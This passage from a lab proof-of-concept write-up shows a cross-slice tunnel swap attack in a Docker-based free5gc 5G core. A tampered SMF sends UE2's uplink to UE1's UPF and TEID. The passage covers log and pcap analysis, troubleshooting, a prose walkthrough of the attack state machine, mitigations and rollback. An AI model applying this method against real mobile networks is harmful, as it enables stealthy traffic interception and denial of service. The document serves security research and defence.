[2026-03-04 08:29:02.725] [nas] [info] UE switches to state [CM-CONNECTED]
[2026-03-04 08:29:02.797] [nas] [debug] Authentication Request received
[2026-03-04 08:29:02.797] [nas] [debug] Received SQN [000000000020]
[2026-03-04 08:29:02.797] [nas] [debug] SQN-MS [000000000000]
[2026-03-04 08:29:02.844] [nas] [debug] Security Mode Command received
[2026-03-04 08:29:02.844] [nas] [debug] Selected integrity[2] ciphering[2]
[2026-03-04 08:29:03.095] [nas] [debug] Registration accept received
[2026-03-04 08:29:03.095] [nas] [info] UE switches to state [MM-REGISTERED/NORMAL-SERVICE]
[2026-03-04 08:29:03.095] [nas] [info] Initial Registration is successful
[2026-03-04 08:29:03.095] [nas] [debug] Sending PDU Session Establishment Request
[2026-03-04 08:29:03.535] [nas] [debug] PDU Session Establishment Accept received
[2026-03-04 08:29:03.535] [nas] [info] PDU Session establishment is successful PSI[1]
[2026-03-04 08:29:03.556] [app] [info] Connection setup for PDU session[1] is successful, TUN interface[uesimtun0, 10.61.0.1] is up.
```

**This is the critical finding**: UE2's logs are **identical in structure** to UE1's. Everything looks normal:
- Registration successful.
- PDU session established.
- TUN interface is up with IP `10.61.0.1` (from UPF2's pool).

UE2 has **absolutely no indication** that its uplink traffic will be misdirected. The attack is invisible at the NAS layer.

### 8e. gNB Logs

Run `docker logs ueransim-gnb 2>&1`. After the restart:

```
UERANSIM v3.2.7
[2026-03-04 08:28:35.763] [sctp] [info] SCTP connection established (10.100.200.16:38412)
[2026-03-04 08:28:35.765] [ngap] [info] NG Setup procedure is successful
[2026-03-04 08:28:41.705] [rrc] [info] RRC Setup for UE[1]
[2026-03-04 08:28:42.274] [ngap] [debug] Initial Context Setup Request received
[2026-03-04 08:28:43.855] [ngap] [info] PDU session resource(s) setup for UE[1] count[1]
[2026-03-04 08:29:02.725] [rrc] [info] RRC Setup for UE[2]
[2026-03-04 08:29:03.094] [ngap] [debug] Initial Context Setup Request received
[2026-03-04 08:29:03.535] [ngap] [info] PDU session resource(s) setup for UE[2] count[1]
```

The gNB successfully set up PDU session resources for both UEs. It used whatever TEID/IP the AMF (from SMF) sent in the `PDUSessionResourceSetupRequest`. The gNB has no mechanism to validate whether the tunnel endpoint is correct for that UE's slice.

### 8f. The Pcap -- Packet-by-Packet Analysis (Three-Layer Proof)

This is the **complete** 30-packet pcap from the actual attack run. To definitively prove the attack, we need to examine **three layers** of each GTP-U packet:

1. **Outer IP header** -- who the gNB sends the packet to (which UPF).
2. **GTP-U header** -- which TEID is used (identifies the tunnel).
3. **Inner IP header** -- the actual UE source IP (proves which UE generated the traffic).

**IP reference table:**

| Entity | IP Address | Role |
|--------|-----------|------|
| gNB | 10.100.200.12 | Sends GTP-U uplink to UPFs |
| UPF1 | 10.100.200.101 | Should serve UE1 (S-NSSAI 010203) |
| UPF2 | 10.100.200.102 | Should serve UE2 (S-NSSAI 112233) |
| UE1 tunnel IP | 10.60.0.1 | Inside GTP-U payload (from UPF1 pool) |
| UE2 tunnel IP | 10.61.0.1 | Inside GTP-U payload (from UPF2 pool) |

#### Reading the raw hex

Each GTP-U packet has this structure (offsets from IP header start):

```
Outer IP header:
  0x000C-0x000F: outer src IP (gNB = 0a64c80c = 10.100.200.12)
  0x0010-0x0013: outer dst IP (UPF  = 0a64c865 = 10.100.200.101)

GTP-U header (starts at outer UDP payload):
  0x0020-0x0023: GTP TEID (e.g., 00000002 = TEID 0x00000002)

Inner IP header (encapsulated inside GTP-U):
  0x002E-0x0031: inner src IP (UE IP, e.g., 0a3c0001 = 10.60.0.1)
  0x0032-0x0035: inner dst IP (e.g., 08080808 = 8.8.8.8)
```

#### Packet 1 -- UE1 uplink (NORMAL, correct behavior)

```
08:29:32.657922 eth0 Out IP 10.100.200.12.2152 > 10.100.200.101.2152: UDP, length 100

  0x0000:  4500 0080 dc28 4000 4011 b90a 0a64 c80c  E....(@.@....d..
  0x0010:  0a64 c865 0868 0868 006c a5b7 34ff 005c  .d.e.h.h.l..4..\
  0x0020:  0000 0002 0000 0085 0110 0100 4500 0054  ............E..T
  0x0030:  a61e 4000 4001 7a3e 0a3c 0001 0808 0808  ..@.@.z>.<......
                                    ^^^^^^^^^^^  ^^^^^^^^^^^
                                    10.60.0.1    8.8.8.8
                                    (UE1 IP)     (ping dest)
```

Three-layer decode:

| Layer | Field | Hex | Decoded | Correct? |
|-------|-------|-----|---------|----------|
| Outer IP | dst | `0a64c865` | **10.100.200.101** (UPF1) | YES -- UE1 should go to UPF1 |
| GTP-U | TEID | `00000002` | **0x00000002** (UPF1 tunnel for UE1) | YES |
| Inner IP | src | `0a3c0001` | **10.60.0.1** (UE1) | YES -- this is UE1's traffic |
| Inner IP | dst | `08080808` | 8.8.8.8 | Ping target |

**Verdict: CORRECT.** UE1 (10.60.0.1) sends through gNB to UPF1 (10.100.200.101) with TEID 0x02.

#### Packet 2 -- UPF1 reply to UE1 (NORMAL)

```
08:29:32.673128 eth0 In IP 10.100.200.101.2152 > 10.100.200.12.2152: UDP, length 100

  0x0020:  0000 0001 0000 0085 0100 0100 4500 0054  ............E..T
  0x0030:  0000 0000 6f01 315d 0808 0808 0a3c 0001  ....o.1].....<..
                                    ^^^^^^^^^^^  ^^^^^^^^^^^
                                    8.8.8.8      10.60.0.1
                                    (reply from) (back to UE1)
```

| Layer | Field | Value | Correct? |
|-------|-------|-------|----------|
| Outer IP | src | 10.100.200.101 (UPF1) | YES |
| GTP-U | TEID | 0x00000001 | YES (downlink TEID) |
| Inner IP | src | 8.8.8.8 | ICMP reply |
| Inner IP | dst | **10.60.0.1** (UE1) | YES |

**Verdict: CORRECT.** UPF1 replies back to UE1 through gNB. Full round-trip works.

#### Packets 3-20: Remaining UE1 pings (all identical pattern)

All 10 ping request/reply pairs follow the same pattern: inner src = **10.60.0.1** (UE1), outer dst = **10.100.200.101** (UPF1), TEID = **0x00000002**. All bidirectional (request + reply). 10/10 pings successful.

---

#### Packet 21 -- UE2 uplink (ATTACK! WRONG UPF!)

This is where the attack becomes visible. UE2 (10.61.0.1) sends a ping, but the gNB sends it to UPF1 instead of UPF2:

```
08:29:41.886071 eth0 Out IP 10.100.200.12.2152 > 10.100.200.101.2152: UDP, length 100

  0x0000:  4500 0080 e1d2 4000 4011 b360 0a64 c80c  E.....@.@..`.d..
  0x0010:  0a64 c865 0868 0868 006c a5b7 34ff 005c  .d.e.h.h.l..4..\
  0x0020:  0000 0002 0000 0085 0110 0100 4500 0054  ............E..T
  0x0030:  e976 4000 4001 36e5 0a3d 0001 0808 0808  .v@.@.6..=......
                                    ^^^^^^^^^^^  ^^^^^^^^^^^
                                    10.61.0.1    8.8.8.8
                                    (UE2 IP!)    (ping dest)
```

Three-layer decode:

| Layer | Field | Hex | Decoded | Correct? |
|-------|-------|-----|---------|----------|
| Outer IP | dst | `0a64c865` | **10.100.200.101** (UPF1) | **NO! Should be 10.100.200.102 (UPF2)** |
| GTP-U | TEID | `00000002` | **0x00000002** (UE1's TEID!) | **NO! Should be 0x00000006 (UE2's TEID)** |
| Inner IP | src | `0a3d0001` | **10.61.0.1** (UE2) | YES -- this IS UE2's traffic |
| Inner IP | dst | `08080808` | 8.8.8.8 | Ping target |

**SMOKING GUN**: The inner IP source is **10.61.0.1 (UE2)**, but the outer IP destination is **10.100.200.101 (UPF1)** and the GTP TEID is **0x00000002 (UE1's tunnel)**. This proves:

1. The traffic originates from UE2 (inner IP 10.61.0.1 from UPF2's pool).
2. The gNB sends it to UPF1 (10.100.200.101) instead of UPF2 (10.100.200.102).
3. It uses UE1's TEID (0x02) instead of UE2's legitimate TEID (0x06).
4. There is **no reply** -- UPF1 drops the packet because it has no PFCP session matching TEID 0x02 with inner source 10.61.0.1.

#### Packets 22-30: Remaining UE2 pings (all misdirected)

Every subsequent UE2 packet shows the same pattern:

```
Pkt  Time         Outer Dst (UPF)    GTP TEID    Inner Src (UE)    Inner Dst   Reply?
21   08:29:41.886 10.100.200.101     0x00000002  10.61.0.1 (UE2)   8.8.8.8     NO
22   08:29:42.909 10.100.200.101     0x00000002  10.61.0.1 (UE2)   8.8.8.8     NO
23   08:29:43.933 10.100.200.101     0x00000002  10.61.0.1 (UE2)   8.8.8.8     NO
24   08:29:44.957 10.100.200.101     0x00000002  10.61.0.1 (UE2)   8.8.8.8     NO
25   08:29:45.981 10.100.200.101     0x00000002  10.61.0.1 (UE2)   8.8.8.8     NO
26   08:29:47.005 10.100.200.101     0x00000002  10.61.0.1 (UE2)   8.8.8.8     NO
27   08:29:48.029 10.100.200.101     0x00000002  10.61.0.1 (UE2)   8.8.8.8     NO
28   08:29:49.053 10.100.200.101     0x00000002  10.61.0.1 (UE2)   8.8.8.8     NO
29   08:29:50.077 10.100.200.101     0x00000002  10.61.0.1 (UE2)   8.8.8.8     NO
30   08:29:51.101 10.100.200.101     0x00000002  10.61.0.1 (UE2)   8.8.8.8     NO
```

Hex proof for packet 30 (last UE2 packet):

```
08:29:51.101708 eth0 Out IP 10.100.200.12.2152 > 10.100.200.101.2152: UDP, length 100

  0x0020:  0000 0002 0000 0085 0110 0100 4500 0054  ............E..T
  0x0030:  ec07 4000 4001 3454 0a3d 0001 0808 0808  ..@.@.4T.=......
                    GTP TEID ^^^^                ^^^^^^^^^^^
                    = 0x00000002                  10.61.0.1 (UE2)
                    (UE1's tunnel!)               sending to 8.8.8.8
```

#### Complete Proof Summary

**Comparison: What should happen vs. what actually happened:**

| UE | Inner IP | Expected Outer Dst | Actual Outer Dst | Expected TEID | Actual TEID | Replies? |
|----|----------|-------------------|------------------|---------------|-------------|----------|
| UE1 | 10.60.0.1 | 10.100.200.101 (UPF1) | 10.100.200.101 (UPF1) | 0x00000002 | 0x00000002 | YES (10/10) |
| UE2 | 10.61.0.1 | **10.100.200.102 (UPF2)** | **10.100.200.101 (UPF1)** | **0x00000006** | **0x00000002** | **NO (0/10)** |

| Metric | Value |
|--------|-------|
| Total packets with inner src 10.60.0.1 (UE1) sent to UPF1 | 10 (correct) |
| Total packets with inner src 10.61.0.1 (UE2) sent to UPF1 | **10 (WRONG!)** |
| Total packets sent to UPF2 (10.100.200.102) | **0** |
| Total packets in entire capture | 30 |

**ATTACK CONFIRMED**: UE2 traffic (inner IP 10.61.0.1) is sent to UPF1 (10.100.200.101) using UE1's TEID (0x00000002). Zero packets reach UPF2. The cross-slice tunnel swap is proven at the packet level.

### 8g. UE Interface Status

Both UEs have their tunnel interfaces up, confirming PDU sessions were established:

```
# UE1
uesimtun0: <POINTOPOINT,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 1400
    inet 10.60.0.1/16 scope global uesimtun0

# UE2
uesimtun0: <POINTOPOINT,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 1400
    inet 10.61.0.1/16 scope global uesimtun0
```

UE1 got `10.60.0.1` (UPF1 pool) -- correct.
UE2 got `10.61.0.1` (UPF2 pool) -- correct IP assignment, but uplink traffic sinkholed.

### 8h. Wireshark Analysis Guide

When you replicate the attack, use these steps to verify the three-layer proof in Wireshark:

**Step 1: Open and filter**

Open `attack_poc/captures/attack_proof_*.pcap` in Wireshark and apply the display filter:
```
gtp
```

**Step 2: Add custom columns for all three layers**

Right-click the column header bar and add these columns:

| Column Title | Field | Type |
|-------------|-------|------|
| Outer Src | `ip.src` | Custom |
| Outer Dst | `ip.dst` | Custom |
| GTP TEID | `gtp.teid` | Custom |
| Inner Src | Select a GTP packet, expand "Internet Protocol Version 4" under "GTP-U", right-click the Source field, "Apply as Column" |
| Inner Dst | Same as above but for the Destination field |

**Step 3: What to look for**

For each packet you should now see all three layers. The attack evidence:

- **UE1 packets**: Inner Src = `10.60.0.1`, Outer Dst = `10.100.200.101` (UPF1), TEID = `0x00000002`. Bidirectional (replies visible). **Correct behavior.**

- **UE2 packets**: Inner Src = `10.61.0.1`, Outer Dst = `10.100.200.101` (**UPF1, WRONG!**), TEID = `0x00000002` (**UE1's TEID, WRONG!**). Outbound only (no replies). **Attack confirmed.**

The definitive proof is a packet where:
- Inner IP source = `10.61.0.1` (UE2, from UPF2's IP pool)
- Outer IP destination = `10.100.200.101` (UPF1, the wrong UPF)
- GTP TEID = `0x00000002` (UE1's tunnel, not UE2's `0x00000006`)

This single packet proves UE2's data is being cross-routed to UE1's UPF and tunnel.

**Step 4: Alternative command-line verification**

If you do not have Wireshark, use `tcpdump -X` to see the raw hex and decode inner IPs manually:

```bash
docker exec ueransim-gnb tcpdump -r /ueransim/captures/attack_proof_*.pcap -n -X
```

In the hex output, look at offset `0x0030` within each packet:
- `0a3c 0001` = 10.60.0.1 (UE1) -- should go to UPF1 (correct)
- `0a3d 0001` = 10.61.0.1 (UE2) -- should go to UPF2 but goes to UPF1 (attack!)

And at offset `0x0020`:
- `0000 0002` = GTP TEID 0x00000002 -- if inner src is UE2, this is the wrong TEID

---

## 9. Troubleshooting Guide

These are the actual errors encountered during development and testing of this setup, with exact symptoms, root causes, and verified fixes.

### Problem 1: WebUI API Returns HTTP 401 "Illegal Token"

**Symptom**: `provision_subscribers.sh` fails with:
```
{"cause":"Illegal Token (Relogin required)!"}
```

**Root Cause**: free5gc WebUI v4.1.0 requires JWT (JSON Web Token) authentication. Older guides that use `Token: admin` or `Token: free5gc` headers no longer work. The WebUI now exposes a `POST /api/login` endpoint.

**Fix**: Log in first to obtain a JWT token, then use it in subsequent API calls:

```bash
# Step 1: Login
login_resp=$(curl -s -X POST "http://localhost:5050/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"free5gc"}')

# Step 2: Extract token
TOKEN=$(echo "$login_resp" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Step 3: Use token in API calls
curl -X POST "http://localhost:5050/api/subscriber/imsi-208930000000001/20893" \
  -H "Content-Type: application/json" \
  -H "Token: ${TOKEN}" \
  -d '{ ... subscriber JSON ... }'
```

**How to verify**: The subscriber creation returns HTTP 201 (Created).

---

### Problem 2: UDM Reports "Nil PermanentKey" / Authentication Fails with 500

**Symptom**: UDM logs show:
```
[ERRO][UDM][UEAU] Nil PermanentKey
```
AUSF returns HTTP 500 to AMF, and the UE receives a Registration Reject with cause "CONGESTION".

**Root Cause**: The subscriber's authentication data is not in MongoDB, or it is stored with the wrong schema. This happens when:

1. The provisioning script failed (due to Problem 1) but the script continued.
2. Previous direct MongoDB inserts (using `mongo` CLI) used incorrect field names.
3. Stale data from a previous run conflicts with the current subscriber.

free5gc stores authentication data in MongoDB collection `subscriptionData.authenticationData.authenticationSubscription`. The critical field is `encPermanentKey` (a flat hex string), NOT `permanentKey.permanentKeyValue` (which is only used by the WebUI display layer). If `encPermanentKey` is empty or missing, the UDM gets a nil pointer.

**Fix**:

1. Always use the WebUI REST API for provisioning (it writes the correct schema).
2. Wipe the MongoDB volume on each fresh run:
   ```bash
   docker compose ... down --volumes --remove-orphans
   ```
3. Verify data in MongoDB after provisioning:
   ```bash
   docker exec mongodb mongo free5gc --quiet --eval \
     'db.getCollection("subscriptionData.authenticationData.authenticationSubscription").find({},{encPermanentKey:1,ueId:1}).pretty()'
   ```
   Expected output: Both subscribers with non-empty `encPermanentKey` values.

**How to verify**: UDM logs show `Handle GenerateAuthDataRequest` followed by HTTP 200 (not 404 or 500), and the UE successfully completes authentication.

---

### Problem 3: UE Authentication Failure -- "SQN out of range"

**Symptom**: UE logs show:
```
[nas] [error] Sending Authentication Failure due to SQN out of range
```
UDM logs show:
```
[WARN][UDM][UEAU] Re-Sync MAC failed
```

**Root Cause**: The subscriber was provisioned with a Sequence Number (SQN) of `16f3b3f70fc2` (the default in some free5gc examples). UERANSIM initializes its UE with SQN-MS = `000000000000`. The gap between the network SQN and the UE's SQN is too large, and the SQN re-synchronization mechanism fails.

In 5G-AKA, the network sends an AUTN containing the SQN. The UE verifies that `SQN_HE - SQN_MS` is within an acceptable range. If the gap is too large, the UE rejects with "SQN out of range" and sends a re-sync parameter. However, if the re-sync MAC verification also fails (due to crypto implementation differences between UERANSIM and free5gc), authentication is permanently stuck.

**Fix**: Set the SQN to a small value close to 0 in `provision_subscribers.sh`:

```bash
SQN="000000000020"
```

**How to verify**: UE logs show:
```
[nas] [debug] Received SQN [000000000020]
[nas] [debug] SQN-MS [000000000000]
```
No "SQN out of range" error. Authentication proceeds to `Security Mode Command`.

---

### Problem 4: SUCI Profile A Re-Sync MAC Failure

**Symptom**: UDM successfully decodes the SUCI (logs show `SuciToSupi Profile A`, `decryption MAC match`), but the re-sync MAC verification fails.

**Root Cause**: When `protectionScheme: 1` is set in UE configs, UERANSIM uses ECIES (Elliptic Curve Integrated Encryption Scheme) Profile A to encrypt the SUPI into a SUCI. While SUCI decryption works correctly, the re-synchronization procedure (triggered by SQN mismatch from Problem 3) uses different cryptographic operations that can have compatibility issues between specific UERANSIM and free5gc versions.

**Fix**: Set `protectionScheme: 0` in both `ue1cfg.yaml` and `ue2cfg.yaml`:

```yaml
protectionScheme: 0
```

This uses the "null scheme" -- the SUPI is sent in cleartext as the SUCI. This is perfectly acceptable for a lab/PoC environment. SUCI encryption is a privacy feature unrelated to the attack being demonstrated.

**How to verify**: AMF logs show the SUCI in clear:
```
MobileIdentity5GS: SUCI[suci-0-208-93-0000-0-0-0000000001]
```
(The `0000-0-0` indicates null scheme. With Profile A, it would show encrypted bytes.)

---

### Problem 5: Pcap Capture Fails / Empty Pcap File

**Symptom**: The pcap file is 0 bytes or only contains the 24-byte file header. The proof report shows "GTP-U packets: 0".

**Root Cause**: Running `tcpdump` on the host requires root/sudo privileges. In non-interactive scripts, `sudo` prompts for a password and hangs. Even with sudo, the bridge interface name `br-free5gc` might not exist yet or might have a different name.

**Fix**: Capture traffic from **inside** the gNB container instead of from the host:

```bash
# Install tcpdump in the gNB container
docker exec ueransim-gnb apt-get update -qq
docker exec ueransim-gnb apt-get install -y -qq tcpdump

# Start background capture (the container sees all N3 GTP-U traffic)
docker exec -d ueransim-gnb timeout 40 tcpdump -i any -w /ueransim/captures/proof.pcap 'udp port 2152'

# Generate traffic, then stop capture
docker exec ueransim-gnb killall tcpdump
```

The gNB container has `NET_ADMIN` capability and its `eth0` interface carries all GTP-U traffic. The `/ueransim/captures/` directory is volume-mounted to `attack_poc/captures/` on the host, so the pcap is accessible from both locations.

**How to verify**: Pcap file size > 1000 bytes. Running `tcpdump -r <file> -n` shows UDP port 2152 traffic.

---

### Problem 6: UERANSIM "Field 'integrity' is missing" / "no cells in coverage"

**Symptom**: UERANSIM UE crashes on startup with a YAML parsing error about missing `integrity` field, or the UE reports "no cells in coverage".

**Fix**: Add these sections to both `ue1cfg.yaml` and `ue2cfg.yaml`:

```yaml
integrity:
  IA1: true
  IA2: true
  IA3: true

ciphering:
  EA1: true
  EA2: true
  EA3: true

integrityMaxRate:
  uplink: "full"
  downlink: "full"
```

For "no cells in coverage", set `linkIp: 0.0.0.0` in `gnbcfg.yaml`. This allows UE containers on different Docker IPs to reach the gNB for radio link simulation.

---

### Problem 7: Docker Network Conflicts

**Symptom**: `docker compose up` fails because the network or container names conflict with an existing deployment.

**Fix**: Use explicit project naming:

```bash
docker compose -f attack_poc/docker-compose-attack.yaml \
  --project-name attack_poc \
  --project-directory . \
  up -d
```

The `--project-directory .` flag is critical -- it ensures volume mount paths (like `./attack_poc/config/...`) resolve relative to the repo root, not relative to the compose file location.

---

## 10. How the Attack Code Works (Deep Dive)

### 10.1 tunnel_swap.go -- The State Machine

The attack module implements a simple 3-state machine:

**State 0: No sessions recorded** (`len(sessions) == 0`)
- First call to `RecordAndSwap()` stores the session info and returns the **original** TEID/IP.
- UE1 gets its correct tunnel info.
- Transitions to State 1.

**State 1: One session recorded, not yet swapped** (`len(sessions) == 1 && !swapped`)
- Second call stores the session info, sets `swapped = true`.
- Returns **Session 1's** TEID/IP instead of Session 2's.
- UE2's N2 message gets UE1's tunnel endpoint.
- Transitions to State 2.

**State 2: Swapped** (`swapped == true && len(sessions) == 2`)
- Any subsequent call looks up the SUPI and returns the **other** session's tunnel info.
- This handles potential N2 re-builds (e.g., during UpCnxState ACTIVATING transitions).

### 10.2 Thread Safety

The `sync.Mutex` ensures that even if two PDU sessions are being established concurrently (in separate goroutines), the recording and swap logic is atomic. This prevents race conditions where both sessions could be recorded as "session 1".

### 10.3 ngap_build.go -- The Injection Point

The patched code sits in `BuildPDUSessionResourceSetupRequestTransfer()`, which is called exactly once per PDU session establishment. The flow:

```
HandlePDUSessionSMContextCreate()
  → ActivateUPFSession()
    → PFCP Session Establishment with UPF (gets TEID)
    → BuildPDUSessionResourceSetupRequestTransfer()  ← ATTACK HERE
      → AttackState.RecordAndSwap(teid, upfIP, supi)
      → If swapped: replace n3IP and teidOct with swapped values
    → N1N2MessageTransfer to AMF (carries the swapped values)
      → AMF forwards to gNB via NGAP
```

The beauty of this injection point is that it is **after** the legitimate PFCP session is established (so the UPF has a valid session and allocates a real TEID) but **before** the tunnel info is sent to the gNB. The UPF is completely unaware of the swap -- it correctly handles its own PFCP session. Only the N2 message to the gNB is tampered with.

### 10.4 What the Logs Tell You

When examining SMF logs, look for these patterns:

- `[ATTACK] Recording session 1:` -- First session captured. Values shown are the **original** (correct) ones.
- `[ATTACK] Session 1 recorded. Waiting for session 2` -- Attack is armed but not yet triggered.
- `[ATTACK] *** SWAP EXECUTED ***` -- The swap happened. Everything below this shows original → swapped values.
- `TEID=0xAAAAAAAA → 0xBBBBBBBB` -- The TEID that was replaced.
- `UPF_IP=X.X.X.X → Y.Y.Y.Y` -- The UPF IP that was replaced.

---

## 11. Why UE2 Is Unaware

This is a fundamental aspect of the attack's stealth:

### 11.1 The PDU Session Establishment Succeeds

From UE2's NAS-layer perspective, the PDU session establishment is completely normal:

1. UE2 sends a PDU Session Establishment Request (NAS message over N1).
2. The SMF processes it correctly: selects UPF2, establishes PFCP session, gets TEID.
3. The SMF sends a PDU Session Establishment Accept (NAS message) back to UE2 with the correct QoS parameters, IP address (10.61.0.1), and session ID.
4. UE2 creates its `uesimtun0` interface and marks the session as active.

The swap only affects the **N2 message** (SMF → AMF → gNB), which tells the gNB where to send uplink GTP-U packets. The UE never sees the N2 message. The NAS messages to the UE are untampered.

### 11.2 What UE2 Observes

- `uesimtun0` is UP with IP `10.61.0.1`.
- Ping to 8.8.8.8 shows "100% packet loss".
- No error messages from the network.
- No de-registration or session release.

From UE2's perspective, this looks like a generic connectivity issue -- maybe a network outage, a routing problem, or congestion. There is no NAS-level indication that the uplink tunnel was misdirected.

### 11.3 The Visibility Gap

| Entity | Knows about the swap? | Why? |
|--------|----------------------|------|
| SMF (attacker) | Yes | It performed the swap |
| UPF1 | No | Receives unexpected GTP-U packets but simply drops them (no matching session) |
| UPF2 | No | Receives zero uplink packets; looks like UE2 is idle |
| AMF | No | Forwarded the N2 message as-is; sees successful PDUSessionResourceSetupResponse |
| gNB | No | Used the TEID/IP from the N2 message; has no way to validate them |
| UE1 | No | Its session works normally |
| UE2 | No | Its session appears established; it just experiences packet loss |

---

## 12. Security Implications and Mitigations

### 12.1 Attack Implications

**Cross-Slice Traffic Redirection**: This attack breaks the fundamental isolation promise of network slicing. Traffic from one slice is redirected to a UPF belonging to another slice, violating tenant boundaries.

**Data Exfiltration**: If the attacker controls UPF1 (or has placed a tap on it), they can capture UE2's uplink traffic -- including sensitive application data.

**Denial of Service**: UE2 loses all connectivity despite having a valid PDU session. This is a targeted DoS that is hard to diagnose because:
- The session appears established in all NF databases.
- NAS-level signaling shows no errors.
- Only packet-level analysis reveals the misdirection.

**Stealth**: No NF logs an error or warning (except the compromised SMF's own attack logs, which a real attacker would suppress). The attack is invisible to standard 5G monitoring.

### 12.2 Mitigations

**N3 Interface Security (IPsec)**: Encrypt and authenticate GTP-U traffic between gNB and UPF using IPsec. This would prevent traffic from being routed to an unauthorized UPF because the gNB and unauthorized UPF would not share IPsec security associations. However, in this attack, the gNB is told to send to UPF1 (a legitimate UPF with valid IPsec), so IPsec alone does not fully prevent this.

**N4 Mutual Authentication**: Strengthen PFCP session security between SMF and UPFs with mutual TLS and integrity verification.

**NF Integrity Monitoring**: Runtime integrity verification of NF binaries (like SMF) using attestation frameworks (e.g., TPM-based remote attestation). Detect if the SMF binary has been tampered with.

**Cross-Reference Validation**: The AMF or a network security function could cross-reference the UPF endpoint in the N2 message against the expected UPF for that UE's slice. If UE2's slice maps to UPF2 but the N2 message specifies UPF1, flag an anomaly.

**Zero-Trust Network Functions**: Don't implicitly trust NF outputs. Validate that the SMF's session setup parameters are consistent with the subscriber's profile and slice assignment.

**Network Slice Isolation Verification**: Periodic automated tests that verify each slice's traffic stays within its assigned UPFs. This is a detection mechanism rather than prevention.

---

## 13. Rollback

To return to a normal (uncompromised) free5gc deployment:

```bash
# 1. Stop the attack stack
cd free5gc-compose
docker compose -f attack_poc/docker-compose-attack.yaml \
  --project-name attack_poc \
  --project-directory . \
  down --volumes --remove-orphans

# 2. Start the normal stack
docker compose up -d

# 3. Verify the compromised image is not in use
docker ps | grep "smf:compromised"  # Should return nothing

# 4. Optionally remove the compromised image
docker rmi free5gc/smf:compromised
```

The attack files in `attack_poc/` do not affect the stock deployment. The stock `docker-compose.yaml` uses the official `free5gc/smf:v4.1.0` image.

---

## Appendix: Quick Reference Commands

```bash
# Check all container status
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Image}}"

# View SMF attack logs
docker logs smf 2>&1 | grep -i "ATTACK"

# View UE registration status
docker logs ueransim-ue1 2>&1 | tail -5
docker logs ueransim-ue2 2>&1 | tail -5

# Check UE tunnel interfaces
docker exec ueransim-ue1 ip addr show uesimtun0
docker exec ueransim-ue2 ip addr show uesimtun0

# Manual ping test
docker exec ueransim-ue1 ping -I uesimtun0 -c 5 8.8.8.8
docker exec ueransim-ue2 ping -I uesimtun0 -c 5 8.8.8.8

# Read pcap from gNB container
docker exec ueransim-gnb tcpdump -r /ueransim/captures/attack_proof_*.pcap -n

# Check MongoDB subscriber data
docker exec mongodb mongo free5gc --quiet --eval \
  'db.getCollection("subscriptionData.authenticationData.authenticationSubscription").find({},{ueId:1,encPermanentKey:1}).pretty()'

# Full NF log dump (for debugging)
for nf in amf smf udm udr ausf nrf nssf pcf; do
  echo "=== $nf ===" && docker logs $nf 2>&1 | tail -20
done
```
